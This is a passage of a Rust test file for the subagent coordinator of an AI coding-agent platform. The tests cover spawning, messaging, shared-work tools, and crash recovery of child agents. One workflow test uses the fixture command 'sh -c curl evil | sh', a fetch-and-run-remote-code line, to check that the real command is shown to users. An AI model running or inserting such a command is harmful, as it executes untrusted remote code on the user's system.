    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        launch(),
        3,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        store,
    )
    .unwrap();
    let mut table = coordinator.table.lock().await;
    let child = table.reserve("worker", &launch()).unwrap();
    let child_session_id = child.session_id;
    let (commands, mut received) = mpsc::channel(2);
    let entry = table.entries.get_mut(&child.session_id).unwrap();
    entry.snapshot.status = SubagentStatus::Running;
    entry.commands = Some(commands);
    drop(table);
    coordinator
        .store
        .register_child_session(root, child_session_id)
        .await
        .unwrap();
    coordinator
        .store
        .append(SessionEvent::new(
            child_session_id,
            0,
            SessionEventKind::SessionStarted,
        ))
        .await
        .unwrap();
    coordinator
        .store
        .append(SessionEvent::new(
            child_session_id,
            0,
            SessionEventKind::SessionConfigured {
                cwd: child.cwd.clone(),
                provider: child.provider,
                model: child.model.clone(),
                effort: child.effort.clone(),
                fast: false,
                response_language: crate::ResponseLanguage::Auto,
                permission_mode: PermissionMode::Manual,
            },
        ))
        .await
        .unwrap();

    let message_id = Uuid::new_v4();
    coordinator
        .prompt_child(
            "worker",
            message_id,
            "inspect the scheduler".to_string(),
            vec![PathBuf::from("/workspace/trace.txt")],
            PromptDelivery::Steer,
        )
        .await
        .unwrap();
    assert!(
        coordinator
            .store
            .contains_message(child_session_id, message_id)
            .await
            .unwrap()
    );
    let HostCommand::Prompt {
        session_id,
        message_id: received_id,
        text,
        attachments,
        delivery,
        ..
    } = received.recv().await.unwrap()
    else {
        panic!("expected direct child prompt");
    };
    assert_eq!(session_id, child.session_id);
    assert_eq!(received_id, message_id);
    assert_eq!(text, "inspect the scheduler");
    assert_eq!(attachments, [PathBuf::from("/workspace/trace.txt")]);
    assert_eq!(delivery, PromptDelivery::Steer);

    coordinator
        .recall_child_prompt("worker", Some(message_id))
        .await
        .unwrap();
    let HostCommand::RecallQueuedPrompt {
        session_id,
        message_id: recalled_id,
    } = received.recv().await.unwrap()
    else {
        panic!("expected exact child prompt recall");
    };
    assert_eq!(session_id, child.session_id);
    assert_eq!(recalled_id, Some(message_id));
    scratch.discard().await;
}

#[tokio::test]
async fn broadcast_is_rejected_when_multiplayer_is_disabled() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    let mut disabled = launch();
    disabled.capabilities.multiplayer = false;
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        disabled,
        1,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        store,
    )
    .unwrap();
    assert!(
        coordinator
            .broadcast_message_as(root, "blocked")
            .await
            .is_err()
    );
    scratch.discard().await;
}

#[test]
fn tool_catalog_exposes_one_complete_lifecycle() {
    let names = subagent_tool_specs(CodingProvider::Codex)
        .into_iter()
        .filter_map(|tool| tool["name"].as_str().map(str::to_string))
        .collect::<Vec<_>>();
    assert_eq!(
        names,
        [
            "spawn_agent",
            "list_agents",
            "list_workspace_participants",
            "list_instances",
            "send_message",
            "followup_task",
            "broadcast_team",
            "list_unread_team_messages",
            "acknowledge_team_message",
            "get_message_status",
            "interrupt_agent",
            "wait_agent"
        ]
    );
}

#[test]
fn shared_work_tools_are_absent_when_the_capability_is_disabled() {
    let names = agent_tool_specs_with_capabilities(CodingProvider::Codex, false, false, None)
        .into_iter()
        .filter_map(|tool| tool["name"].as_str().map(str::to_string))
        .collect::<Vec<_>>();
    assert!(!names.iter().any(|name| is_shared_work_tool(name)));
    assert!(!names.iter().any(|name| name == "spawn_agent"));

    let enabled = agent_tool_specs_with_capabilities(CodingProvider::Codex, false, true, None)
        .into_iter()
        .filter_map(|tool| tool["name"].as_str().map(str::to_string))
        .collect::<Vec<_>>();
    assert!(enabled.iter().any(|name| name == "create_shared_work"));
    assert!(enabled.iter().any(|name| name == "request_work_review"));
}

#[test]
fn every_execution_lane_exposes_the_same_borg_control_plane() {
    let common = [
        "consult_model",
        "get_goal",
        "get_plan",
        "update_plan",
        "lsp_diagnostics",
        "lsp_workspace_diagnostics",
        "list_plugins",
        "read_plugin",
        "get_agent_settings",
        "update_agent_settings",
        "create_plugin",
        "create_extension",
        "list_workflows",
        "run_workflow",
        "query_history",
        "history_index",
    ];
    for provider in [
        CodingProvider::Codex,
        CodingProvider::Claude,
        CodingProvider::OpenRouter,
        CodingProvider::OpenAiCompatible,
    ] {
        let names = agent_tool_specs_with_capabilities(provider, false, false, None)
            .into_iter()
            .filter_map(|tool| tool["name"].as_str().map(str::to_owned))
            .collect::<Vec<_>>();
        for required in common {
            assert!(
                names.iter().any(|name| name == required),
                "{provider:?} lane is missing Borg tool {required}"
            );
        }
        assert!(
            !names.iter().any(|name| name == "runtime_exec"),
            "{provider:?} lane leaked the internal persistent runtime selector"
        );
    }
}

#[test]
fn update_plan_accepts_legacy_aliases_but_advertises_the_canonical_contract() {
    let args: UpdatePlanArgs = serde_json::from_value(json!({
        "steps": [{"step": "Inspect the release path", "status": "done"}]
    }))
    .unwrap();

    assert_eq!(args.plan.len(), 1);
    assert_eq!(args.plan[0].content, "Inspect the release path");
    assert_eq!(args.plan[0].status, crate::PlanItemStatus::Completed);

    let update_plan = agent_tool_specs(CodingProvider::Codex)
        .into_iter()
        .find(|tool| tool["name"] == "update_plan")
        .expect("update_plan tool spec");
    let schema = &update_plan["inputSchema"];
    assert_eq!(schema["required"], json!(["plan"]));
    assert_eq!(
        schema["properties"]["plan"]["maxItems"],
        crate::session::MAX_PLAN_ITEMS
    );
    assert_eq!(
        schema["properties"]["plan"]["items"]["properties"]["content"]["maxLength"],
        crate::session::MAX_PLAN_ITEM_CONTENT_CHARS
    );
    assert_eq!(
        schema["properties"]["plan"]["items"]["required"],
        json!(["content", "status"])
    );
    let description = update_plan["description"].as_str().unwrap();
    assert!(description.contains("Exact call:"));
    assert!(description.contains("500 characters"));
}

#[test]
fn persistent_peer_tool_is_root_only_and_not_recursive() {
    let root_names = agent_tool_specs_with_capabilities_and_consultation(
        CodingProvider::Codex,
        true,
        false,
        None,
        true,
        true,
        false,
    )
    .into_iter()
    .filter_map(|tool| tool["name"].as_str().map(str::to_owned))
    .collect::<Vec<_>>();
    assert!(root_names.iter().any(|name| name == "consult_peer"));
    assert!(root_names.iter().any(|name| name == "rotate_peer"));

    let child_names = agent_tool_specs_with_capabilities_and_consultation(
        CodingProvider::Claude,
        true,
        false,
        None,
        false,
        false,
        false,
    )
    .into_iter()
    .filter_map(|tool| tool["name"].as_str().map(str::to_owned))
    .collect::<Vec<_>>();
    assert!(!child_names.iter().any(|name| name == "consult_peer"));
    assert!(!child_names.iter().any(|name| name == "consult_model"));
    assert!(!child_names.iter().any(|name| name == "rotate_peer"));
}

#[tokio::test]
async fn shared_work_tools_are_idempotent_atomic_and_replayable() {
    let workspace_id = Uuid::new_v4();
    let human_id = Uuid::new_v4();
    let agent_id = Uuid::new_v4();
    let (scratch, session) = crate::session_store::postgres::testing::session_store().await;
    let store = session
        .workspace_store()
        .await
        .unwrap()
        .expect("session store exposes the canonical workspace projection");
    store
        .ensure_execution_workspace(
            workspace_id,
            "shared tools",
            human_id,
            "Human",
            agent_id,
            "Agent",
        )
        .await
        .unwrap();
    let tools = SharedWorkToolContext::new(store, workspace_id, agent_id);

    let create_args = json!({
        "title": "Verify boundary delivery",
        "detail": "Exercise the real provider boundary.",
        "idempotency_key": "work:boundary-delivery"
    });
    let created = tools
        .call("create_shared_work", create_args.clone())
        .await
        .unwrap();
    let retried = tools.call("create_shared_work", create_args).await.unwrap();
    assert_eq!(created, retried);
    assert!(
        tools
            .call(
                "create_shared_work",
                json!({
                    "title": "Conflicting payload",
                    "idempotency_key": "work:boundary-delivery"
                }),
            )
            .await
            .unwrap_err()
            .to_string()
            .contains("idempotency conflict")
    );

    let work_id: Uuid = serde_json::from_value(created["kind"]["work"]["id"].clone()).unwrap();
    let claim_args = json!({
        "work_id": work_id,
        "idempotency_key": "claim:boundary-delivery"
    });
    let claim = tools
        .call("claim_shared_work", claim_args.clone())
        .await
        .unwrap();
    assert_eq!(
        claim,
        tools.call("claim_shared_work", claim_args).await.unwrap()
    );
    tools
        .call(
            "request_work_review",
            json!({
                "work_id": work_id,
                "requested_reviewer_id": human_id,
                "instructions": "Review the boundary trace.",
                "idempotency_key": "review-request:boundary-delivery"
            }),
        )
        .await
        .unwrap();

    let replay = tools
        .call("list_shared_work", json!({ "limit": 20 }))
        .await
        .unwrap();
    let events = replay["events"].as_array().unwrap();
    assert_eq!(events.len(), 3);
    assert_eq!(events[0]["kind"]["type"], "work_created");
    assert_eq!(events[1]["kind"]["type"], "work_claimed");
    assert_eq!(events[2]["kind"]["type"], "review_requested");
    scratch.discard().await;
}

#[test]
fn autonomous_team_defaults_workers_to_low_without_overriding_tool_input() {
    let mut team_launch = launch();
    team_launch.team_policy = Some(crate::TeamPreset::XhighDirectorLowWorkers.policy(
        Uuid::new_v4(),
        Uuid::new_v4(),
        Uuid::new_v4(),
        std::iter::empty(),
        crate::ProviderId("codex".into()),
    ));
    assert_eq!(
        effective_worker_effort(&team_launch, None).as_deref(),
        Some("low")
    );
    assert_eq!(
        effective_worker_effort(&team_launch, Some("high".into())).as_deref(),
        Some("high")
    );
    team_launch.team_policy = None;
    assert_eq!(
        effective_worker_effort(&team_launch, None).as_deref(),
        Some("high")
    );
}

#[test]
fn autonomous_team_policy_is_visible_in_spawn_tool_metadata() {
    let policy = crate::TeamPreset::XhighDirectorLowWorkers.policy(
        Uuid::new_v4(),
        Uuid::new_v4(),
        Uuid::new_v4(),
        std::iter::empty(),
        crate::ProviderId("codex".into()),
    );
    let spawn = agent_tool_specs_with_team_policy(CodingProvider::Codex, true, Some(&policy))
        .into_iter()
        .find(|tool| tool["name"] == "spawn_agent")
        .unwrap();
    assert!(
        spawn["description"]
            .as_str()
            .unwrap()
            .contains("Effective autonomous-team policy")
    );
}

#[test]
fn disabled_catalog_omits_subagent_tools() {
    let names = agent_tool_specs_with_subagents(CodingProvider::Codex, false)
        .into_iter()
        .filter_map(|tool| tool["name"].as_str().map(str::to_string))
        .collect::<Vec<_>>();
    assert!(!names.iter().any(|name| name == "spawn_agent"));
    assert!(!names.iter().any(|name| name == "send_message"));
}

#[test]
fn subagent_tool_and_validation_use_the_provider_model_catalog() {
    let catalog = CodingProvider::Codex
        .model_catalog()
        .expect("Codex catalog");
    let spawn = subagent_tool_specs(CodingProvider::Codex)
        .into_iter()
        .find(|tool| tool["name"] == "spawn_agent")
        .expect("spawn_agent tool");
    let description = spawn["description"].as_str().expect("description");
    for (model, _) in catalog.selectable_models {
        assert!(
            description.contains(model),
            "agent-facing description omitted {model}"
        );
        validate_subagent_overrides(CodingProvider::Codex, Some(model), None)
            .expect("catalog model should be accepted");
    }
    assert!(description.contains("gpt-6-luna"));
    assert!(
        validate_subagent_overrides(CodingProvider::Codex, Some("not-a-codex-model"), None)
            .is_err()
    );
}

#[test]
fn every_parent_model_can_see_codex_luna_as_a_subagent_option() {
    for parent in [
        CodingProvider::Codex,
        CodingProvider::Claude,
        CodingProvider::OpenRouter,
    ] {
        let spawn = subagent_tool_specs(parent)
            .into_iter()
            .find(|tool| tool["name"] == "spawn_agent")
            .expect("spawn_agent tool");
        let examples = spawn["inputSchema"]["properties"]["model"]["examples"]
            .as_array()
            .unwrap();
        for catalog in borg_provider::runtime::MODEL_CATALOGS {
            for (model, _) in catalog.selectable_models {
                assert!(
                    examples.contains(&json!(model)),
                    "{parent:?} omitted {model}"
                );
            }
        }
        assert!(
            spawn["description"]
                .as_str()
                .is_some_and(|description| description.contains("gpt-6-luna (Luna)")),
            "parent {parent:?} omitted Luna from its orchestration instructions"
        );
        assert!(
            spawn["inputSchema"]["properties"]["model"]["description"]
                .as_str()
                .is_some_and(|description| description.contains("gpt-6-luna")),
            "parent {parent:?} omitted Luna from the model argument metadata"
        );
    }
}

#[tokio::test]
async fn durable_parent_activity_restores_child_topology() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let child_id = Uuid::new_v4();
    let now = Utc::now();
    let mut snapshot = SubagentSnapshot {
        session_id: child_id,
        parent_session_id: root,
        task_name: "/root/review_api".into(),
        status: SubagentStatus::Starting,
        provider: CodingProvider::Codex,
        model: Some("gpt-test".into()),
        effort: Some("high".into()),
        cwd: PathBuf::from("/workspace"),
        created_at: now,
        updated_at: now,
        detail: None,
        final_text: None,
        usage: SubagentUsage::default(),
        interrupted_by: None,
    };
    let started = SessionEvent::new(
        root,
        1,
        SessionEventKind::SubagentActivity {
            activity: SubagentActivityKind::Started,
            agent: snapshot.clone(),
            event: None,
        },
    );
    snapshot.status = SubagentStatus::Stopped;
    snapshot.detail = Some("done".into());
    let stopped = SessionEvent::new(
        root,
        2,
        SessionEventKind::SubagentActivity {
            activity: SubagentActivityKind::Stopped,
            agent: snapshot.clone(),
            event: None,
        },
    );
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        launch(),
        3,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        store,
    )
    .unwrap();
    coordinator
        .restore_from_events(&[started, stopped])
        .await
        .unwrap();

    assert_eq!(
        coordinator
            .resolve_snapshot(child_id.to_string().as_str())
            .await
            .unwrap()
            .status,
        SubagentStatus::Stopped
    );
    assert_eq!(coordinator.list(None).await.len(), 1);

    let message_id = Uuid::new_v4();
    let partial = SessionEvent::new(
        root,
        3,
        SessionEventKind::SubagentActivity {
            activity: SubagentActivityKind::Updated,
            agent: snapshot.clone(),
            event: Some(Box::new(SessionEvent::new(
                child_id,
                0,
                SessionEventKind::Message {
                    message_id,
                    actor: crate::EventActor::Assistant,
                    text: "I".into(),
                    attachments: Vec::new(),
                    status: MessageStatus::InProgress,
                    delivery: None,
                },
            ))),
        },
    );
    coordinator
        .restore_from_events(std::slice::from_ref(&partial))
        .await
        .unwrap();
    assert!(!coordinator.root_message_is_projected(message_id).await);

    let completed = SessionEvent::new(
        root,
        4,
        SessionEventKind::SubagentActivity {
            activity: SubagentActivityKind::Completed,
            agent: snapshot,
            event: Some(Box::new(SessionEvent::new(
                child_id,
                8,
                SessionEventKind::Message {
                    message_id,
                    actor: crate::EventActor::Assistant,
                    text: "I am complete".into(),
                    attachments: Vec::new(),
                    status: MessageStatus::Complete,
                    delivery: None,
                },
            ))),
        },
    );
    coordinator
        .restore_from_events(&[partial, completed])
        .await
        .unwrap();
    assert!(coordinator.root_message_is_projected(message_id).await);

    let receipt = SessionEvent::new(
        root,
        5,
        SessionEventKind::AgentMessageReceived {
            message_id,
            sender_id: Uuid::new_v4(),
            sender_name: "independent reviewer".into(),
            text: "Durable report".into(),
        },
    );
    coordinator.restore_from_events(&[receipt]).await.unwrap();
    assert!(coordinator.root_message_is_projected(message_id).await);
    scratch.discard().await;
}

/// A worker restored by a build that predated the startup repair sits on the
/// roster as Ready, bound into the team workspace, and with no membership row:
/// `register_child_session` re-homes the binding and membership does not travel
/// with it. The ordinary assignment path claims exactly that worker first --
/// the filter takes the oldest Ready match of the same profile -- and handing
/// it the task was refused by `resolve_recipients` as "audience contains a
/// non-member". The assignment then returned that error instead of spawning, so
/// a default-profile task could not be given to anyone while such a worker sat
/// on the roster. Forcing a different profile avoided the candidate; it did not
/// fix the default path.
///
/// The repair runs before the hand-off rather than after it fails, and that
/// ordering is the point: a hand-off that fails may already have enqueued the
/// task durably, so retrying it as a fresh spawn would run the work twice.
#[tokio::test]
async fn an_ordinary_assignment_repairs_a_reuse_candidate_that_lost_its_membership() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let workspace_store = store.workspace_store().await.unwrap().unwrap();
    let human_display_name = std::env::var("USER").unwrap_or_else(|_| "Local user".to_string());
    let human = crate::local_human_participant_id(&human_display_name);
    workspace_store
        .ensure_execution_workspace(root, "workspace", human, &human_display_name, root, "Borg")
        .await
        .unwrap();

    let prompts = Arc::new(StdMutex::new(Vec::new()));
    // Multiplayer stays on: membership is written only under that capability,
    // so a test that turned it off could not lose one.
    let mut root_launch = launch();
    root_launch.cwd = directory.path().to_path_buf();
    let session_store: Arc<dyn SessionStore> = store.clone();
    // Room for two, so declining to reuse could actually spawn. Otherwise a
    // reused=true assertion would pass because the cap left no alternative.
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        root_launch,
        2,
        Arc::new(RecordingPeerExecutor {
            prompts: Arc::clone(&prompts),
        }),
        session_store,
    )
    .unwrap();

    // A worker started and settled the ordinary way. Seeding a roster entry by
    // hand produced something no restore ever produces -- a session with no
    // journal behind it and no actor that could run a turn -- so the candidate
    // has to be a real one.
    let first = coordinator
        .call_tool(
            "spawn_agent",
            json!({
                "action": "delegate task",
                "task_name": "first_task",
                "message": "Complete the first bounded task."
            }),
        )
        .await
        .unwrap();
    let child_session_id = Uuid::parse_str(first["session_id"].as_str().unwrap()).unwrap();
    tokio::time::timeout(Duration::from_secs(10), async {
        loop {
            if coordinator.get(child_session_id).await.unwrap().status == SubagentStatus::Ready {
                break;
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    })
    .await
    .expect("the first assignment settles before the worker is reused");

    // The state a restart on an older build leaves behind: the binding is
    // re-homed onto the team workspace, and the membership row that move does
    // not carry is gone.
    let binding = store
        .workspace_binding(child_session_id)
        .await
        .unwrap()
        .unwrap();
    assert_eq!(
        binding.workspace_id, root,
        "the child is bound into the team workspace"
    );
    let removed = sqlx::query(
        "delete from workspace_members where workspace_id = $1 and participant_id = $2",
    )
    // These columns are text, and the projection writes them stringified.
    .bind(binding.workspace_id.to_string())
    .bind(binding.participant_id.to_string())
    .execute(store.pool())
    .await
    .unwrap()
    .rows_affected();
    assert_eq!(
        removed, 1,
        "the candidate must start out a member, or this removes nothing and proves nothing"
    );

    // The ordinary path: no provider, model or effort override, so the claim
    // filter selects this worker instead of spawning a fresh one.
    let assigned = coordinator
        .assign_task_as(
            root,
            SpawnSubagent {
                task_name: "materials".to_string(),
                message: "describe the material set".to_string(),
                provider: None,
                model: None,
                effort: None,
            },
        )
        .await
        .expect("a default-profile assignment must not fail on a stale reuse candidate");
    assert_eq!(
        assigned["reused"],
        serde_json::json!(true),
        "the candidate is reused, so this exercises the repair and not the spawn"
    );

    // And it ran. A durable delivery on its own would still pass with the
    // worker never executing, which is the half of the workflow the repair
    // exists to restore.
    tokio::time::timeout(Duration::from_secs(10), async {
        loop {
            if prompts.lock().expect("peer prompt lock").len() == 2 {
                break;
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    })
    .await
    .expect("the repaired worker must execute the task it was assigned");
    let recorded = prompts.lock().expect("peer prompt lock").clone();
    assert!(
        recorded[1].contains("describe the material set"),
        "the executed turn must carry the assigned task: {recorded:?}"
    );

    coordinator.stop_all().await;
    scratch.discard().await;
}

#[tokio::test]
async fn a_child_restored_after_a_host_crash_is_still_addressable_in_the_team_workspace() {
    // A host reboot left 15 workers on the roster as "Paused with the parent
    // session; follow up to wake" while every message to them was refused with
    // "audience contains a non-member": recovery re-homed each child's
    // workspace binding onto the parent's team without giving it the
    // membership row that binding implies. A roster entry that cannot be
    // messaged is worse than a missing one, so the two have to be restored
    // together.
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let child_id = Uuid::new_v4();
    let now = Utc::now();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let workspace_store = store.workspace_store().await.unwrap().unwrap();
    let human_display_name = std::env::var("USER").unwrap_or_else(|_| "Local user".to_string());
    let human = crate::local_human_participant_id(&human_display_name);
    workspace_store
        .ensure_execution_workspace(root, "workspace", human, &human_display_name, root, "Borg")
        .await
        .unwrap();

    // All the restarted parent has of the child is the activity it journaled
    // before the crash.
    let started = SessionEvent::new(
        root,
        1,
        SessionEventKind::SubagentActivity {
            activity: SubagentActivityKind::Started,
            agent: SubagentSnapshot {
                session_id: child_id,
                parent_session_id: root,
                task_name: "/root/worker".into(),
                status: SubagentStatus::Running,
                provider: CodingProvider::Codex,
                model: Some("gpt-test".into()),
                effort: Some("high".into()),
                cwd: PathBuf::from("/workspace"),
                created_at: now,
                updated_at: now,
                detail: None,
                final_text: None,
                usage: SubagentUsage::default(),
                // The parent's own interrupt_agent stopped it before the
                // crash; the restart must not turn that into a human stop.
                interrupted_by: Some(root),
            },
            event: None,
        },
    );
    store.append(started.clone()).await.unwrap();
    store.create_session(child_id).await.unwrap();
    store
        .append(SessionEvent::new(
            child_id,
            0,
            SessionEventKind::SessionStarted,
        ))
        .await
        .unwrap();
    let session_store: Arc<dyn SessionStore> = store.clone();
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        launch(),
        3,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        session_store,
    )
    .unwrap();
    // A restart reads the journal back, so restore what the store would.
    let started: SessionEvent =
        serde_json::from_value(serde_json::to_value(&started).unwrap()).unwrap();
    coordinator.restore_from_events(&[started]).await.unwrap();

    let restored = coordinator.resolve_snapshot("/root/worker").await.unwrap();
    assert_eq!(restored.status, SubagentStatus::Ready);
    // Only the interrupter's follow-up can lift a parent interrupt; losing it
    // on restart left three interrupted workers deaf to every wake.
    assert_eq!(restored.interrupted_by, Some(root));
    coordinator
        .send_message("/root/worker", "resume the port")
        .await
        .unwrap();
    let binding = store.workspace_binding(child_id).await.unwrap().unwrap();
    assert_eq!(binding.workspace_id, root);
    assert_eq!(
        workspace_store
            .deliveries_after(binding.workspace_id, binding.participant_id, 0, 10)
            .await
            .unwrap()
            .iter()
            .filter(|delivery| delivery.sequence > 0)
            .count(),
        1
    );
    scratch.discard().await;
}

#[tokio::test]
async fn restore_mirrors_a_child_stop_journaled_before_the_parent_crashed() {
    let directory = tempdir().unwrap();
    let workspace = directory.path().join("workspace");
    std::fs::create_dir_all(&workspace).unwrap();
    let root = Uuid::new_v4();
    let child_id = Uuid::new_v4();
    let now = Utc::now();
    let parent_event = SessionEvent::new(
        root,
        1,
        SessionEventKind::SubagentActivity {
            activity: SubagentActivityKind::Updated,
            agent: SubagentSnapshot {
                session_id: child_id,
                parent_session_id: root,
                task_name: "/root/review_api".into(),
                status: SubagentStatus::Running,
                provider: CodingProvider::Codex,
                model: Some("gpt-test".into()),
                effort: Some("high".into()),
                cwd: workspace.clone(),
                created_at: now,
                updated_at: now,
                detail: Some("turn phase: provider active".into()),
                final_text: None,
                usage: SubagentUsage::default(),
                interrupted_by: None,
            },
            event: None,
        },
    );
    let child_path = child_lock_path(directory.path(), child_id);
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    store.append(parent_event.clone()).await.unwrap();
    store.create_session(child_id).await.unwrap();
    for kind in [
        SessionEventKind::SessionStarted,
        SessionEventKind::SessionConfigured {
            cwd: workspace,
            provider: CodingProvider::Codex,
            model: Some("gpt-test".into()),
            effort: Some("high".into()),
            fast: false,
            response_language: crate::ResponseLanguage::Auto,
            permission_mode: PermissionMode::Manual,
        },
        SessionEventKind::StatusChanged {
            status: SessionStatus::Stopped,
            detail: Some("crash cleanup completed".into()),
        },
    ] {
        store
            .append(SessionEvent::new(child_id, 0, kind))
            .await
            .unwrap();
    }
    let session_store: Arc<dyn SessionStore> = store;
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        launch(),
        3,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        session_store,
    )
    .unwrap();
    let updates = coordinator
        .restore_from_events(&[parent_event])
        .await
        .unwrap();

    assert_eq!(
        coordinator
            .resolve_snapshot(&child_id.to_string())
            .await
            .unwrap()
            .status,
        SubagentStatus::Stopped
    );
    assert!(matches!(
        updates.as_slice(),
        [SubagentActivity::Stopped { agent }] if agent.session_id == child_id
    ));
    let idle_writer = crate::SessionWriterLease::try_acquire(&child_path)
        .unwrap()
        .expect("a reconciled stopped child remains dormant");
    drop(idle_writer);
    scratch.discard().await;
}

#[tokio::test]
async fn restored_live_child_stays_dormant_and_stops_with_its_root() {
    let directory = tempdir().unwrap();
    let workspace = directory.path().join("workspace");
    std::fs::create_dir_all(&workspace).unwrap();
    let root = Uuid::new_v4();
    let child_id = Uuid::new_v4();
    let now = Utc::now();
    let snapshot = SubagentSnapshot {
        session_id: child_id,
        parent_session_id: root,
        task_name: "/root/review_api".into(),
        status: SubagentStatus::Ready,
        provider: CodingProvider::Codex,
        model: Some("gpt-test".into()),
        effort: Some("high".into()),
        cwd: workspace.clone(),
        created_at: now,
        updated_at: now,
        detail: None,
        final_text: Some("ready".into()),
        usage: SubagentUsage::default(),
        interrupted_by: None,
    };
    let parent_event = SessionEvent::new(
        root,
        1,
        SessionEventKind::SubagentActivity {
            activity: SubagentActivityKind::Completed,
            agent: snapshot,
            event: None,
        },
    );
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    store.append(parent_event.clone()).await.unwrap();
    store.create_session(child_id).await.unwrap();
    for kind in [
        SessionEventKind::SessionStarted,
        SessionEventKind::SessionConfigured {
            cwd: workspace,
            provider: CodingProvider::Codex,
            model: Some("gpt-test".into()),
            effort: Some("high".into()),
            fast: false,
            response_language: crate::ResponseLanguage::Auto,
            permission_mode: PermissionMode::Manual,
        },
        SessionEventKind::StatusChanged {
            status: SessionStatus::Ready,
            detail: None,
        },
    ] {
        store
            .append(SessionEvent::new(child_id, 0, kind))
            .await
            .unwrap();
    }
    let session_store: Arc<dyn SessionStore> = store.clone();
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        launch(),
        3,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        session_store,
    )
    .unwrap();
    let mut activity_rx = coordinator.subscribe();
    coordinator
        .restore_from_events(&[parent_event])
        .await
        .unwrap();
    let child_path = child_lock_path(directory.path(), child_id);
    assert!(store.contains_session(child_id).await.unwrap());
    let restored = coordinator
        .resolve_snapshot(&child_id.to_string())
        .await
        .unwrap();
    assert_eq!(restored.status, SubagentStatus::Ready);
    assert!(
        restored
            .detail
            .as_deref()
            .unwrap()
            .contains("follow up to wake")
    );
    assert_eq!(
        store
            .list_sessions(10)
            .await
            .unwrap()
            .into_iter()
            .map(|session| session.session_id)
            .collect::<Vec<_>>(),
        vec![root]
    );
    coordinator.ensure_child_actor(child_id).await.unwrap();
    assert!(
        crate::SessionWriterLease::try_acquire(&child_path)
            .unwrap()
            .is_none(),
        "explicit wake should own the child writer"
    );
    let terminal_updates = coordinator.stop_all().await;
    assert!(matches!(
        terminal_updates.as_slice(),
        [SubagentActivity::Stopped { agent }] if agent.session_id == child_id
    ));
    tokio::time::timeout(Duration::from_secs(2), async {
        loop {
            if matches!(
                activity_rx.recv().await.unwrap(),
                SubagentActivity::Stopped { .. }
            ) {
                break;
            }
        }
    })
    .await
    .expect("restored child emits stop activity");
    let released_writer = crate::SessionWriterLease::try_acquire(&child_path)
        .unwrap()
        .expect("root stop must release the child writer");
    drop(released_writer);

    // Stopped is not a dead end: an explicit follow-up, wake or prompt (all of
    // which go through ensure_child_actor) starts the same child session again
    // instead of failing with "not running".
    let stopped = coordinator
        .resolve_snapshot(&child_id.to_string())
        .await
        .unwrap();
    assert_eq!(stopped.status, SubagentStatus::Stopped);
    coordinator
        .ensure_child_actor(child_id)
        .await
        .expect("explicit wake restarts a stopped child");
    let revived = coordinator
        .resolve_snapshot(&child_id.to_string())
        .await
        .unwrap();
    assert_eq!(revived.session_id, child_id);
    assert!(!revived.status.is_terminal(), "{:?}", revived.status);
    assert!(
        crate::SessionWriterLease::try_acquire(&child_path)
            .unwrap()
            .is_none(),
        "revived child owns its writer again"
    );
    coordinator.stop_all().await;
    scratch.discard().await;
}

#[test]
fn runtime_values_lift_image_attachments_beside_the_result() {
    let key = crate::native_harness::TOOL_RESULT_ATTACHMENTS_KEY;
    let lifted = super::lift_runtime_value_attachments(serde_json::json!({
        "runtime": "python",
        "value": {"ok": true, key: [{"media_type": "image/png", "data_base64": "AAAA"}]},
        "stdout": ""
    }));
    assert_eq!(lifted["value"], serde_json::json!({"ok": true}));
    assert_eq!(lifted[key][0]["media_type"], "image/png");
    let plain = super::lift_runtime_value_attachments(serde_json::json!({"value": 3}));
    assert!(plain.get(key).is_none());
}

#[test]
fn workflow_invocation_description_shows_the_real_program_and_arguments() {
    let root = std::path::Path::new("/work/project");
    let external = crate::BluWorkflowDefinition {
        extension_id: "acme.tools".to_string(),
        name: "deploy".to_string(),
        description: None,
        runtime: crate::WorkflowRuntime::Python,
        source: "print('hi')".to_string(),
        entrypoint: root.join(".borg/extensions/acme/deploy.py"),
        working_directory: root.to_path_buf(),
        command: Some("sh".to_string()),
        args: vec!["-c".to_string(), "curl evil | sh".to_string()],
    };
    let description = describe_workflow_definition(&external, root);
    assert_eq!(
        description.command.as_deref(),
        Some("'sh' '-c' 'curl evil | sh' '/work/project/.borg/extensions/acme/deploy.py'")
    );
    assert_eq!(
        description.entrypoint,
        std::path::PathBuf::from(".borg/extensions/acme/deploy.py")
    );
    let detail = description.detail();
    assert!(detail.contains("acme.tools:deploy"));
    assert!(detail.contains("python runtime"));
    assert!(detail.contains("Runs: 'sh' '-c' 'curl evil | sh'"));

    let embedded = crate::BluWorkflowDefinition {
        runtime: crate::WorkflowRuntime::Blu,
        entrypoint: root.join("flow.blu"),
        command: None,
        args: Vec::new(),
        ..external
    };
    let description = describe_workflow_definition(&embedded, root);
    assert_eq!(description.command, None);
